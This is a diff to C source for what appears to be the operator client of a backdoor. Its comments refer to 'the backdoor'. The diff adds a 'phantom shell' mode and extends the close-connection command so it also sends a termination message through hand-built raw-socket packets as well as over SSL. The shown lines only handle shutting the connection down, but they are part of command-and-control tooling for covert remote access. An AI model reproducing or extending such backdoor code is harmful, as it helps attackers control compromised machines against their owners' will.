@@ -22,6 +22,8 @@
 #define RESET "\x1B[0m"
 
 #define CLIENT_MODE_LIVE_COMMAND 0
+#define CLIENT_MODE_PHANTOM_SHELL 0
+
 //Global variable, specifying current client mode
 int client_mode = CLIENT_MODE_LIVE_COMMAND;
 
@@ -39,12 +41,22 @@ int client_mode = CLIENT_MODE_LIVE_COMMAND;
  * @param buf 
  * @return int 
  */
-int manage_global_command(char* buf, SSL* ssl){
+int manage_global_command(char* buf, SSL* ssl, char* local_ip, char* dest){
     if(strncmp(buf, GC_SERVER_CLOSE_CONN, strlen(GC_SERVER_CLOSE_CONN))==0){
 		if(ssl != NULL){
             //If in a ssl connection
             char* request = CC_PROT_FIN;
             SSL_write(ssl, request, strlen(request));
+            //We must exit now
+            printf("[" KBLU "INFO" RESET "]""Connection with the backdoor halted\n");
+            exit(0);
+        }else{
+            char* request = CC_PROT_FIN;
+            packet_t packet = build_standard_packet(8000, 9000, local_ip, dest, 4096, request);
+            if(rawsocket_send(packet)<0){
+                printf("["KRED"ERROR"RESET"]""An error occured. Aborting...\n");
+                return -1;
+            }
             //We must exit now
             printf("[" KBLU "INFO" RESET "]""Connection with the backdoor halted\n");
             exit(0);
